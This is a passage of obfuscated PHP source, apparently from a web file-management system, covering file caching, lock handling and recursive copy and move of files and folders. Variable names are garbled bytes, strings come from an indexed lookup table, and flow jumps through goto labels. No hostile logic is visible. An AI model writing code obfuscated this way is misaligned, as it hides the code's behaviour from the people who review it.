($úúÌÔã[$»ÕÎ°¶‰[555]][$»ÕÎ°¶‰[631]] <= time() - $¶ƒİé) { $this->metaSet($úúÌÔã[$»ÕÎ°¶‰[191]], $»ÕÎ°¶‰[632], null); $this->metaSet($úúÌÔã[$»ÕÎ°¶‰[191]], $»ÕÎ°¶‰[631], null); unset($úúÌÔã[$»ÕÎ°¶‰[555]][$»ÕÎ°¶‰[632]]); continue; } $„×ÖÂ˜ = $úúÌÔã[$»ÕÎ°¶‰[555]][$»ÕÎ°¶‰[632]]; $úúÌÔã[$»ÕÎ°¶‰[555]][$»ÕÎ°¶‰[633]] = Model($»ÕÎ°¶‰[617])->getInfoSimpleOuter($„×ÖÂ˜); } } unset($úúÌÔã); } public function parentLevelArray($ò—”„‘ ) { $¦¶Ã’ª¢ =& $_SERVER[œ—üé‹ê]; $ò—”„‘  = explode($¦¶Ã’ª¢[50], trim($ò—”„‘ , $¦¶Ã’ª¢[50])); return array_to_int(array_filter($ò—”„‘ )); } public function listAll($ˆÉ©åìÄ) { $ğíùæÉ¡ =& $_SERVER[œ—üé‹ê]; $Ò·±Áİƒ = $this->sourceInfo($ˆÉ©åìÄ); $¢àùúîä = array($ğíùæÉ¡[634] => array($ğíùæÉ¡[635], $Ò·±Áİƒ[$ğíùæÉ¡[604]] . $ˆÉ©åìÄ . $ğíùæÉ¡[636]), $ğíùæÉ¡[637] => 0); $³Å´£ç = $ğíùæÉ¡[638]; $‘¹şŞ¼ = "\114\x45\106\x54\x20\x4a\117\x49\116\40{$this->tablePrefix}\151\x6f\137\x66\151\154\145\x20\146\151\x6c\145\40\157\x6e\40\x73\157\x75\162\x63\145\x2e\146\151\154\145\111\104\x20\75\40\x66\151\154\x65\56\x66\x69\x6c\145\111\x44"; $Ôß»êòÒ = $this->alias($ğíùæÉ¡[533])->field($³Å´£ç)->where($¢àùúîä)->join($‘¹şŞ¼)->select(); $this->_listAppendAuth($Ôß»êòÒ); $this->_listAppendUser($Ôß»êòÒ); $this->_listAppendPath($Ôß»êòÒ); $Ôß»êòÒ = array_to_keyvalue($Ôß»êòÒ, $ğíùæÉ¡[191]); $™ š›Îƒ = "\57{$Ò·±Áİƒ[$ğíùæÉ¡[32]]}\57"; $™ š›Îƒ = $™ š›Îƒ == $ğíùæÉ¡[254] ? $ğíùæÉ¡[8] : $™ š›Îƒ; $•ƒø»ò¯ = array(); foreach ($Ôß»êòÒ as $õŞŞÂ˜ï => $û‚€Ø®ü) { $åÈäÕ»¹ = $this->parentLevelArray($û‚€Ø®ü[$ğíùæÉ¡[604]]); array_shift($åÈäÕ»¹); $ŸÛïìÀÚ = $™ š›Îƒ; for ($¸›¯•š¹ = 0; $¸›¯•š¹ < count($åÈäÕ»¹); $¸›¯•š¹++) { $ŸÛïìÀÚ .= $Ôß»êòÒ[$åÈäÕ»¹[$¸›¯•š¹]][$ğíùæÉ¡[32]] . $ğíùæÉ¡[8]; } $ŸÛïìÀÚ .= $û‚€Ø®ü[$ğíùæÉ¡[32]]; if ($û‚€Ø®ü[$ğíùæÉ¡[500]]) { $ŸÛïìÀÚ .= $ğíùæÉ¡[8]; } $æ‹ÜğÊ” = array($ğíùæÉ¡[510] => str_replace($ğíùæÉ¡[254], $ğíùæÉ¡[8], str_replace($ğíùæÉ¡[254], $ğíùæÉ¡[8], str_replace($ğíùæÉ¡[254], $ğíùæÉ¡[8], $ŸÛïìÀÚ))), $ğíùæÉ¡[639] => intval($û‚€Ø®ü[$ğíùæÉ¡[500]]), $ğíùæÉ¡[640] => intval($û‚€Ø®ü[$ğíùæÉ¡[79]]), $ğíùæÉ¡[88] => intval($û‚€Ø®ü[$ğíùæÉ¡[88]]), $ğíùæÉ¡[90] => $this->pathInfoFilter($û‚€Ø®ü)); if (!$æ‹ÜğÊ”[$ğíùæÉ¡[500]]) { $æ‹ÜğÊ”[$ğíùæÉ¡[557]] = $û‚€Ø®ü[$ğíùæÉ¡[557]]; } $•ƒø»ò¯[] = $æ‹ÜğÊ”; } $•ƒø»ò¯ = array_sort_by($•ƒø»ò¯, $ğíùæÉ¡[87]); return $•ƒø»ò¯; } } goto F¼àİ•Ş™Á; CùçÒ„‹Şí: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($›¤ÂßŸ¶, $Âóö•ú•) { $ğÄÃ¾Ë =& $_SERVER[œ—üé‹ê]; $this->cachePath = $›¤ÂßŸ¶[$ğÄÃ¾Ë[87]]; $this->prefix = $ğÄÃ¾Ë[999]; $this->cacheTime = $Âóö•ú•; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ÕìåòÕÌ) { $øºİ½›ú =& $_SERVER[œ—üé‹ê]; $ÕìåòÕÌ = str_replace(array($øºİ½›ú[1000], $øºİ½›ú[97], $øºİ½›ú[76]), $øºİ½›ú[1001], $ÕìåòÕÌ); return $this->cachePath . $øºİ½›ú[1002] . $ÕìåòÕÌ . $øºİ½›ú[1003]; } public function set($àÃÁòäŸ, $—İÁ¡ø¾, $õÔœ¬¾­ = false) { $õÔœ¬¾­ = $õÔœ¬¾­ ? $õÔœ¬¾­ : $this->cacheTime; $ÆáÔ”Ç› = $this->getFile($àÃÁòäŸ); if (file_put_contents($ÆáÔ”Ç›, $this->prefix . $—İÁ¡ø¾, LOCK_EX)) { @touch($ÆáÔ”Ç›, intval(time() + $õÔœ¬¾­)); clearstatcache(); return !0; } @unlink($ÆáÔ”Ç›); return !1; } public function get($¤ÄöÉñ) { $®Ší‡ıÅ = $this->getFile($¤ÄöÉñ); if (file_exists($®Ší‡ıÅ) && filemtime($®Ší‡ıÅ) < time()) { @unlink($®Ší‡ıÅ); return !1; } $ó×ÉÃæó = @file_get_contents($®Ší‡ıÅ); return substr($ó×ÉÃæó, strlen($this->prefix)); } public function remove($ÂÓ³òÓ”) { $üî¶²Ÿ× = $this->getFile($ÂÓ³òÓ”); return @unlink($üî¶²Ÿ×); } public function deleteAll() { $ĞÅûµ—ë =& $_SERVER[œ—üé‹ê]; $„ˆ’É¾¥ = scandir($this->cachePath); foreach ($„ˆ’É¾¥ as $ÏÓ®”Ï®) { $‹‡·ó·ï = $this->cachePath . $ÏÓ®”Ï®; if (strpos($‹‡·ó·ï, $ĞÅûµ—ë[1003]) && strpos($‹‡·ó·ï, $ĞÅûµ—ë[1004])) { @unlink($‹‡·ó·ï); } } } public function clearTimeout() { $êÆ‰¯à¼ =& $_SERVER[œ—üé‹ê]; $úªÆö = scandir($this->cachePath); foreach ($úªÆö as $—ŞŸ•ş•) { $Íİ­û™— = $this->cachePath . $—ŞŸ•ş•; if (strpos($Íİ­û™—, $êÆ‰¯à¼[1003]) && strpos($Íİ­û™—, $êÆ‰¯à¼[1004]) && filemtime($Íİ­û™—) < time()) { @unlink($Íİ­û™—); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÊõĞÏ =& $_SERVER[œ—üé‹ê]; if (self::$handle) { return self::$handle; } $ƒÈ®ƒ— = $GLOBALS[$ÊõĞÏ[6]][$ÊõĞÏ[424]]; self::$timeout = $ƒÈ®ƒ—[$ÊõĞÏ[1005]] ? $ƒÈ®ƒ—[$ÊõĞÏ[1005]] : 10; $¨åï¼½€ = _get($GLOBALS[$ÊõĞÏ[6]], $ÊõĞÏ[1006]); $óËõ€£ê = $ƒÈ®ƒ—[$ÊõĞÏ[988]] ? $ƒÈ®ƒ—[$ÊõĞÏ[988]] : $ÊõĞÏ[230]; if ($óËõ€£ê == $ÊõĞÏ[21] && $¨åï¼½€ == $ÊõĞÏ[13]) { $óËõ€£ê = $ÊõĞÏ[230]; } switch ($óËõ€£ê) { case $ÊõĞÏ[991]: self::$handle = new CacheLockRedis(); break; case $ÊõĞÏ[992]: self::$handle = new CacheLockMemcached(); break; case $ÊõĞÏ[21]: self::$handle = new CacheLockDatabase(); break; case $ÊõĞÏ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÊõĞÏ[1007], $ÊõĞÏ[1008]); } return self::$handle; } private static function key($õ¦½ªØÙ) { return $_SERVER[œ—üé‹ê][1009] . Cache::key($õ¦½ªØÙ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($èÙä¨‚µ = '') { self::$errorMsg = $èÙä¨‚µ; } public static function lockGlobal($ã†á¼à, $İ‡´»ˆ) { return self::lock($ã†á¼à, $İ‡´»ˆ, !0); } public static function lock($ÒÓù”›, $ƒîêßŒ = false, $´©ÆüÈ© = false) { $Ç°¿©‚ç =& $_SERVER[œ—üé‹ê]; $ƒº¯š›µ = self::init(); $¯à“íì = self::key($ÒÓù”›); $ƒîêßŒ = $ƒîêßŒ ? $ƒîêßŒ : self::$timeout; $íÒÎêıô = timeFloat(); if (_get($GLOBALS, $Ç°¿©‚ç[1010], !1)) { if (!$ƒº¯š›µ->lock($¯à“íì, 0.2)) { die; } return !0; } $ÚÀ…Í = $ƒº¯š›µ->lock($¯à“íì, $ƒîêßŒ); $”Ãö£ÆÈ = timeFloat(); if (!$ÚÀ…Í) { $ªò—Â€ß = "\x6c\157\143\153\40\x65\162\162\x6f\162\x3b\153\x65\x79\75{$ÒÓù”›}\x3b\164\151\155\145\75{$ƒîêßŒ}\73" . self::$errorMsg . $Ç°¿©‚ç[74] . get_caller_msg(); $ËØçÅş = LNG($Ç°¿©‚ç[1011]) . "\50{$ƒîêßŒ}\163\x29\x2e" . LNG($Ç°¿©‚ç[1012]); $ËØçÅş .= $Ç°¿©‚ç[1013]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ËØçÅş = $ËØçÅş . $Ç°¿©‚ç[1014] . self::$errorMsg; } write_log($Ç°¿©‚ç[1015] . sprintf($Ç°¿©‚ç[1016], timeFloat() - $íÒÎêıô) . $Ç°¿©‚ç[1017] . $ªò—Â€ß . $Ç°¿©‚ç[1018] . json_encode(error_get_last()), $Ç°¿©‚ç[1008]); show_json($ËØçÅş, !1); } if (!$´©ÆüÈ©) { self::$lockItem[$¯à“íì] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÏÒ¡¿¡¤ = number_format(timeFloat() - $”Ãö£ÆÈ, 3); write_log($Ç°¿©‚ç[1019] . $ÒÓù”› . $Ç°¿©‚ç[1020] . $ÏÒ¡¿¡¤, $Ç°¿©‚ç[1008]); } return $ÚÀ…Í; } public static function lockGet($âç‰àÛï) { $û«€‰À = self::key($âç‰àÛï); if (self::$lockItem[$û«€‰À]) { return self::$lockItem[$û«€‰À]; } return self::init()->lockGet($û«€‰À); } public static function unlock($î¨Û½ô) { $ËÊÓ¶ =& $_SERVER[œ—üé‹ê]; $ÜÎ¼Œ³ = self::key($î¨Û½ô); self::$lockItem[$ÜÎ¼Œ³] = null; self::init()->unlock($ÜÎ¼Œ³); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ËÊÓ¶[1021] . $î¨Û½ô, $ËÊÓ¶[1008]); } return; } public static function unlockRuntime() { $Ñ¸¹ÏĞ‡ =& $_SERVER[œ—üé‹ê]; $ê·üÑá’ = self::init(); $¡…•Ã‰ = !1; foreach (self::$lockItem as $ÜÔÃ–Û¥ => $áëşÎş†) { if (!$áëşÎş†) { continue; } $ê·üÑá’->unlock($ÜÔÃ–Û¥); if (!$¡…•Ã‰) { $¡…•Ã‰ = !0; write_log($Ñ¸¹ÏĞ‡[1022] . $ÜÔÃ–Û¥ . $Ñ¸¹ÏĞ‡[74] . get_caller_msg(), $Ñ¸¹ÏĞ‡[1008]); continue; } write_log($Ñ¸¹ÏĞ‡[1022] . $ÜÔÃ–Û¥, $Ñ¸¹ÏĞ‡[1008]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ô¾Å®Ú = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ñ¸¹ÏĞ‡[1023] . $Ô¾Å®Ú . $Ñ¸¹ÏĞ‡[1024] . ACTION, $Ñ¸¹ÏĞ‡[1008]); } } public static function fileLock($Ûå‡ù¯) { $ì›åüÙ’ =& $_SERVER[œ—üé‹ê]; if (!$GLOBALS[$ì›åüÙ’[1025]]) { $GLOBALS[$ì›åüÙ’[1025]] = array(); } $GLOBALS[$ì›åüÙ’[1025]][$Ûå‡ù¯] = !1; $§‰ŸÂ°ô = fopen(DATA_PATH . $Ûå‡ù¯ . $ì›åüÙ’[1026], $ì›åüÙ’[1027]); if (!$§‰ŸÂ°ô) { return !1; } $GLOBALS[$ì›åüÙ’[1025]][$Ûå‡ù¯] = $§‰ŸÂ°ô; if (flock($§‰ŸÂ°ô, LOCK_EX)) { return !0; } self::unlock($Ûå‡ù¯); show_json($ì›åüÙ’[1028], !1); return !1; } public static function fileUnlock($²ÁéÚ¢) { $„àÇ¶š£ =& $_SERVER[œ—üé‹ê]; $ìõÛúª = $GLOBALS[$„àÇ¶š£[1025]][$²ÁéÚ¢]; if (!$ìõÛúª) { return; } $GLOBALS[$„àÇ¶š£[1025]][$²ÁéÚ¢] = !1; flock($ìõÛúª, LOCK_UN); fclose($ìõÛúª); } public static function fileUnlockAll() { $Óñé™Á =& $_SERVER[œ—üé‹ê]; if (!isset($GLOBALS[$Óñé™Á[1025]]) || !$GLOBALS[$Óñé™Á[1025]]) { return; } foreach ($GLOBALS[$Óñé™Á[1025]] as $ì³šçˆä => $ÛÉ•Ôƒ) { if (!$ÛÉ•Ôƒ) { continue; } $GLOBALS[$Óñé™Á[1025]][$ì³šçˆä] = !1; flock($ÛÉ•Ôƒ, LOCK_UN); fclose($ÛÉ•Ôƒ); } $GLOBALS[$Óñé™Á[1025]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto Cƒ©Ò¬à…†; F¼àİ•Ş™Á: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ËßÖ’…) { $¢ÍÁ ¹ =& $_SERVER[œ—üé‹ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($¢ÍÁ ¹[641], $ËßÖ’…); $çúª°®€ = 1; $this->_lockEvent($ËßÖ’…, array($¢ÍÁ ¹[642], $¢ÍÁ ¹[643]), $çúª°®€); $this->_lockParent($ËßÖ’…, array($¢ÍÁ ¹[643]), $çúª°®€); $this->_lockEvent($ËßÖ’…, array($¢ÍÁ ¹[644], $¢ÍÁ ¹[645]), $çúª°®€); $this->_lockCheckEnd($¢ÍÁ ¹[641], $ËßÖ’…); } public function lockCopyEnd($‚ú¶ö±) { $ø½Ã…Ô¿ =& $_SERVER[œ—üé‹ê]; if (!$this->allowLock()) { return; } $²ûç‹Í­ = 0; $this->_lockEvent($‚ú¶ö±, array($ø½Ã…Ô¿[642], $ø½Ã…Ô¿[643]), $²ûç‹Í­); $this->_lockParent($‚ú¶ö±, array($ø½Ã…Ô¿[643]), $²ûç‹Í­); $this->_lockEvent($‚ú¶ö±, array($ø½Ã…Ô¿[644], $ø½Ã…Ô¿[645]), $²ûç‹Í­); } public function lockWriteStart($ ø¬Ææ, $üºÍŸÌ˜ = '') { $”·üÜ¬‘ =& $_SERVER[œ—üé‹ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($”·üÜ¬‘[642], $ ø¬Ææ); $íÃÄ‹ı = 1; $this->_lockKey($”·üÜ¬‘[646] . $ ø¬Ææ . $”·üÜ¬‘[10] . $üºÍŸÌ˜, $íÃÄ‹ı); $this->_lockEvent($ ø¬Ææ, array($”·üÜ¬‘[641], $”·üÜ¬‘[643]), $íÃÄ‹ı); $this->_lockParent($ ø¬Ææ, array($”·üÜ¬‘[641], $”·üÜ¬‘[643]), $íÃÄ‹ı); $this->_lockCheckEnd($”·üÜ¬‘[642], $ ø¬Ææ); } public function lockWriteEnd($Š¶é¼—ª, $ÂÕÄ«İŸ = '') { $Ñ°§ÅÍ¤ =& $_SERVER[œ—üé‹ê]; if (!$this->allowLock()) { return; } $ëˆò¸ = 0; $this->_lockKey($Ñ°§ÅÍ¤[646] . $Š¶é¼—ª . $Ñ°§ÅÍ¤[10] . $ÂÕÄ«İŸ, $ëˆò¸); $this->_lockEvent($Š¶é¼—ª, array($Ñ°§ÅÍ¤[641], $Ñ°§ÅÍ¤[643]), $ëˆò¸); $this->_lockParent($Š¶é¼—ª, array($Ñ°§ÅÍ¤[641], $Ñ°§ÅÍ¤[643]), $ëˆò¸); } public function lockMoveStart($Ã‚ˆÛÑ) { $«­ òï¾ =& $_SERVER[œ—üé‹ê]; if (!$this->allowLock()) { return; } $this->_lockCheck($«­ òï¾[643], $Ã‚ˆÛÑ); $–âşºƒÎ = 1; $this->_lockKey($«­ òï¾[647] . $Ã‚ˆÛÑ, $–âşºƒÎ); $this->_lockEvent($Ã‚ˆÛÑ, array($«­ òï¾[641], $«­ òï¾[642]), $–âşºƒÎ); $this->_lockParent($Ã‚ˆÛÑ, array($«­ òï¾[641], $«­ òï¾[643]), $–âşºƒÎ); $this->_lockEvent($Ã‚ˆÛÑ, array($«­ òï¾[648], $«­ òï¾[644], $«­ òï¾[645]), $–âşºƒÎ); $this->_lockCheckEnd($«­ òï¾[643], $Ã‚ˆÛÑ); } public function lockMoveEnd($ş¼œÄ–”) { $â¸øçô =& $_SERVER[œ—üé‹ê]; if (!$this->allowLock()) { return; } $†ƒÓ™Ò = 0; $this->_lockKey($â¸øçô[647] . $ş¼œÄ–”, $†ƒÓ™Ò); $this->_lockEvent($ş¼œÄ–”, array($â¸øçô[641], $â¸øçô[642]), $†ƒÓ™Ò); $this->_lockParent($ş¼œÄ–”, array($â¸øçô[641], $â¸øçô[643]), $†ƒÓ™Ò); $this->_lockEvent($ş¼œÄ–”, array($â¸øçô[648], $â¸øçô[644], $â¸øçô[645]), $†ƒÓ™Ò); } private function _lockCheck($Ã‚İÙû, $ÉÊµ‰Ò) { $é´ìœï =& $_SERVER[œ—üé‹ê]; $¨üïëÅú = $this->sourceInfo($ÉÊµ‰Ò); $ÎÇ ±ĞÙ = $Ã‚İÙû . $é´ìœï[10] . $ÉÊµ‰Ò; $this->_lockTimeStart[$ÎÇ ±ĞÙ] = timeFloat(); if (!is_array($¨üïëÅú)) { return; } $šè¯Œ = LNG($é´ìœï[649]); CacheLock::setErrorMsg($é´ìœï[173] . htmlspecialchars($¨üïëÅú[$é´ìœï[32]]) . $é´ìœï[175] . $šè¯Œ); $this->_lockKey($ÎÇ ±ĞÙ, 1); $this->_lockKey($ÎÇ ±ĞÙ, 0); $´ˆÑ­ûì = array_reverse($this->parentLevelArray($¨üïëÅú[$é´ìœï[604]])); foreach ($´ˆÑ­ûì as $’„‡¼­‚) { $ÎÇ ±ĞÙ = $Ã‚İÙû . $é´ìœï[650] . $’„‡¼­‚; if (CacheLock::lockGet($é´ìœï[651] . $ÎÇ ±ĞÙ)) { $¨üïëÅú = $this->sourceInfo($’„‡¼­‚); CacheLock::setErrorMsg($é´ìœï[173] . htmlspecialchars($¨üïëÅú[$é´ìœï[32]]) . $é´ìœï[175] . $šè¯Œ); $this->_lockKey($ÎÇ ±ĞÙ, 1); $this->_lockKey($ÎÇ ±ĞÙ, 0); } } } private function _lockCheckEnd($üÕš¦á, $åÈë€Š·) { $Øä§åã® =& $_SERVER[œ—üé‹ê]; $„§ıÒ°Õ = $üÕš¦á . $Øä§åã®[10] . $åÈë€Š·; CacheLock::setErrorMsg($Øä§åã®[463]); if (!isset($this->_lockTimeStart[$„§ıÒ°Õ])) { return; } $ù™ËÃÎ = timeFloat() - $this->_lockTimeStart[$„§ıÒ°Õ]; unset($this->_lockTimeStart[$„§ıÒ°Õ]); if ($ù™ËÃÎ > 0.5) { unset(self::$cacheSourceInfo[$Øä§åã®[547] . $åÈë€Š·]); } $õƒè²šª = $this->sourceInfo($åÈë€Š·); if (!$õƒè²šª) { show_json(LNG($Øä§åã®[105]), !1); } } private function _lockParent($ø¤êêœ, $ŞˆÏ’ì, $úôóáŠë) { if (!$this->autoLockSet) { return; } $­÷ø½Â¡ = $this->sourceInfo($ø¤êêœ); if (!is_array($­÷ø½Â¡)) { return; } $ü’˜¶ûá = array_reverse($this->parentLevelArray($­÷ø½Â¡[$_SERVER[œ—üé‹ê][604]])); foreach ($ü’˜¶ûá as $Ü±ëé”¾) { $this->_lockEvent($Ü±ëé”¾, $ŞˆÏ’ì, $úôóáŠë); } } private function _lockEvent($úøû”´×, $¤âº¯üÈ, $Â†¨ğÀá) { $ş™Ã‚“¬ =& $_SERVER[œ—üé‹ê]; if (!$this->autoLockSet) { return; } foreach ($¤âº¯üÈ as $ãÉÄÀ†Ä) { $÷ğÂ±× = $ãÉÄÀ†Ä . $ş™Ã‚“¬[10] . $úøû”´×; if ($Â†¨ğÀá && CacheLock::lockGet($ş™Ã‚“¬[651] . $÷ğÂ±×)) { continue; } $this->_lockKey($÷ğÂ±×, $Â†¨ğÀá); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($È–±¹Ãµ, $ß€ÄÍ¸÷ = 1) { $ÕÃ²Ûöš = $_SERVER[œ—üé‹ê][651] . md5($È–±¹Ãµ); if ($ß€ÄÍ¸÷) { if (isset(self::$_lockItemArr[$ÕÃ²Ûöš])) { return; } self::$_lockItemArr[$ÕÃ²Ûöš] = 1; CacheLock::lock($ÕÃ²Ûöš, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÕÃ²Ûöš])) { return; } unset(self::$_lockItemArr[$ÕÃ²Ûöš]); CacheLock::unlock($ÕÃ²Ûöš); } } public function isParentOf($ÚË€–´õ, $ëÚóœåı) { $«ÆÈ©êÎ =& $_SERVER[œ—üé‹ê]; $ÁÂğ¾•å = $this->sourceInfo($ÚË€–´õ); $­º¥™ûÜ = $this->sourceInfo($ëÚóœåı); $Â±üãà‹ = $ÁÂğ¾•å[$«ÆÈ©êÎ[604]] . $ÁÂğ¾•å[$«ÆÈ©êÎ[191]] . $«ÆÈ©êÎ[50]; $òæäƒ†Ê = $­º¥™ûÜ[$«ÆÈ©êÎ[604]] . $­º¥™ûÜ[$«ÆÈ©êÎ[191]] . $«ÆÈ©êÎ[50]; $‹“ëÜşØ = strpos($òæäƒ†Ê, $Â±üãà‹) === 0; return $‹“ëÜşØ; } private $targetIsDelete = 0; public function copy($ÅÕå·÷É, $¨¨¯«Ğ, $“ß¾¿‚Ç = REPEAT_REPLACE, $¯ï®ÏÅ = '') { $°ˆ¥¤«… =& $_SERVER[œ—üé‹ê]; $ôößÌÌò = $this->sourceInfo($ÅÕå·÷É); $™°æ„ÆÆ = $this->sourceInfo($¨¨¯«Ğ); if (!$ôößÌÌò || !$™°æ„ÆÆ || $™°æ„ÆÆ[$°ˆ¥¤«…[500]] != $°ˆ¥¤«…[91]) { return !1; } if ($this->isParentOf($ÅÕå·÷É, $¨¨¯«Ğ)) { return !1; } $¥Úù‹’ğ = $¯ï®ÏÅ ? $¯ï®ÏÅ : $ôößÌÌò[$°ˆ¥¤«…[32]]; $this->lockCopyStart($ÅÕå·÷É); $this->lockWriteStart($¨¨¯«Ğ, $¥Úù‹’ğ); $ÌŠü¤ãÅ = array($°ˆ¥¤«…[652] => array(), $°ˆ¥¤«…[653] => array(), $°ˆ¥¤«…[654] => array()); $this->targetIsDelete = intval($ôößÌÌò[$°ˆ¥¤«…[520]]); $ÀÑÖÁË = $this->fileNameExistAuto($¨¨¯«Ğ, $ôößÌÌò); $”Ğ™°ûØ = $this->_copy($ÅÕå·÷É, $¨¨¯«Ğ, $“ß¾¿‚Ç, $ÌŠü¤ãÅ, !0, $¯ï®ÏÅ); $this->_childrenListClear(); $this->lockCopyEnd($ÅÕå·÷É); $this->lockWriteEnd($¨¨¯«Ğ, $¥Úù‹’ğ); if ($ôößÌÌò[$°ˆ¥¤«…[500]] == $°ˆ¥¤«…[91] && $ÀÑÖÁË == $”Ğ™°ûØ) { $this->folderSizeResetChildren($ÀÑÖÁË); } Model($°ˆ¥¤«…[471])->addAll($ÌŠü¤ãÅ[$°ˆ¥¤«…[653]], array(), !0); if ($ÀÑÖÁË != $”Ğ™°ûØ || $ôößÌÌò[$°ˆ¥¤«…[500]] == $°ˆ¥¤«…[91]) { Model($°ˆ¥¤«…[655])->eventCopy($”Ğ™°ûØ); } $this->saveAll($ÌŠü¤ãÅ[$°ˆ¥¤«…[654]]); Model($°ˆ¥¤«…[230])->linkAdd($ÌŠü¤ãÅ[$°ˆ¥¤«…[652]]); $this->folderSizeReset($¨¨¯«Ğ); $this->updateModifyTime($¨¨¯«Ğ); return $”Ğ™°ûØ; } private function _copy($Ç¬Şê–¹, $¢Ö·ÌÒÓ, $³¾èÚ†‘, &$“†¼Û’, $€ñşê€û, $ÜÊÖÌÛ = '') { $¯¶ú±ƒ =& $_SERVER[œ—üé‹ê]; $ã˜İşƒà = $this->sourceInfoCache($Ç¬Şê–¹); $½ÊªÕàß = $ã˜İşƒà[$¯¶ú±ƒ[500]] == $¯¶ú±ƒ[91]; $ÅÒËˆÁƒ = $ÜÊÖÌÛ ? $ÜÊÖÌÛ : $ã˜İşƒà[$¯¶ú±ƒ[32]]; $âçèûä£ = $this->fileNameExistAuto($¢Ö·ÌÒÓ, $ã˜İşƒà); if ($€ñşê€û) { $this->_childrenAllMake($Ç¬Şê–¹); if ($½ÊªÕàß && $âçèûä£) { $this->_childrenAllMake($âçèûä£); } } if (!$âçèûä£) { return $this->_copyCreate($Ç¬Şê–¹, $¢Ö·ÌÒÓ, $ÅÒËˆÁƒ, $“†¼Û’); } $Ô•»Â¡ = $âçèûä£; if ($½ÊªÕàß) { if ($³¾èÚ†‘ == REPEAT_RENAME_FOLDER) { $ÅÒËˆÁƒ = $this->fileNameAutoCache($¢Ö·ÌÒÓ, $ÅÒËˆÁƒ, $³¾èÚ†‘, $½ÊªÕàß); $Ô•»Â¡ = $this->_copyCreate($Ç¬Şê–¹, $¢Ö·ÌÒÓ, $ÅÒËˆÁƒ, $“†¼Û’); } else { $„šçÀÓû = $this->_childrenList($Ç¬Şê–¹); foreach ($„šçÀÓû as $ƒ‘·®§) { $this->_copy($ƒ‘·®§[$¯¶ú±ƒ[191]], $âçèûä£, $³¾èÚ†‘, $“†¼Û’, !1); } } } else { if ($³¾èÚ†‘ == REPEAT_RENAME || $³¾èÚ†‘ == REPEAT_RENAME_FOLDER) { $ÅÒËˆÁƒ = $this->fileNameAutoCache($¢Ö·ÌÒÓ, $ÅÒËˆÁƒ, $³¾èÚ†‘, $½ÊªÕàß); $Ô•»Â¡ = $this->_copyCreate($Ç¬Şê–¹, $¢Ö·ÌÒÓ, $ÅÒËˆÁƒ, $“†¼Û’); } else { if ($³¾èÚ†‘ == REPEAT_REPLACE) { $‹®¯”Ş© = $this->sourceInfoCache($âçèûä£); $Á¤Æ¤Ûµ = $this->fileHistory($‹®¯”Ş©, $ã˜İşƒà[$¯¶ú±ƒ[557]], $ã˜İşƒà[$¯¶ú±ƒ[79]]); if ($Á¤Æ¤Ûµ) { $“†¼Û’[$¯¶ú±ƒ[652]][] = $ã˜İşƒà[$¯¶ú±ƒ[557]]; } } else { if ($³¾èÚ†‘ == REPEAT_SKIP) { } } } Hook::trigger($¯¶ú±ƒ[656], array($¯¶ú±ƒ[657], $ã˜İşƒà, 0)); } return $Ô•»Â¡; } private function _copyCreate($ú†ƒ¤×ä, $¸ûß¤©, $ØğÙÖÏÜ, &$‘Â£ùè·) { $”Ö™Ÿ“² =& $_SERVER[œ—üé‹ê]; $Äé×“òÃ = $this->sourceInfoCache($ú†ƒ¤×ä); $Ö²³ëÃË = $this->sourceInfoCache($¸ûß¤©); $ÜÂËÜ‹ö = $this->_makeItemData($Äé×“òÃ, $Ö²³ëÃË, $ØğÙÖÏÜ); Hook::trigger($”Ö™Ÿ“²[658], $ÜÂËÜ‹ö); Hook::trigger($”Ö™Ÿ“²[659], array($”Ö™Ÿ“²[660], $ÜÂËÜ‹ö, 0)); $˜õáï½Ã = $this->add($ÜÂËÜ‹ö); $±‘ò¦Ê = array($”Ö™Ÿ“²[191] => $˜õáï½Ã, $”Ö™Ÿ“²[32] => $ØğÙÖÏÜ); $this->_copyApplyMeta($±‘ò¦Ê, $‘Â£ùè·); if ($Äé×“òÃ[$”Ö™Ÿ“²[500]] != $”Ö™Ÿ“²[91]) { $‘Â£ùè·[$”Ö™Ÿ“²[652]][] = $Äé×“òÃ[$”Ö™Ÿ“²[557]]; return $˜õáï½Ã; } $ØíÒÊìİ = array(); $õÕóç‰Ç = array(); $this->_childrenListAll($ú†ƒ¤×ä, $ØíÒÊìİ); $«„™Şó = count($ØíÒÊìİ); if ($«„™Şó == 0) { return $˜õáï½Ã; } $ŸÇÁÚû = $this->sourceInfo($˜õáï½Ã); foreach ($ØíÒÊìİ as $òö’å¡Ğ) { $ÌøÌ‘À¬ = $this->_makeItemData($òö’å¡Ğ, $ŸÇÁÚû, $òö’å¡Ğ[$”Ö™Ÿ“²[32]]); $ÌøÌ‘À¬[$”Ö™Ÿ“²[604]] = $òö’å¡Ğ[$”Ö™Ÿ“²[604]]; $õÕóç‰Ç[] = $ÌøÌ‘À¬; } $this->chunkEventSet($”Ö™Ÿ“²[661], array($”Ö™Ÿ“²[662], $ÜÂËÜ‹ö, $«„™Şó)); $this->addAll($õÕóç‰Ç, array(), !1); $ïßÕß– = $this->where(array($”Ö™Ÿ“²[190] => $˜õáï½Ã))->select(); $›‡Ÿ‚šÜ = $this->_childrenMakeRelation($ØíÒÊìİ, $ïßÕß–); $›‡Ÿ‚šÜ[$ú†ƒ¤×ä] = $˜õáï½Ã; $Â¦öşË = array(); $ŸŠ·ËÁ± = array(); foreach ($ïßÕß– as $òö’å¡Ğ) { $Ï²‰¡ = 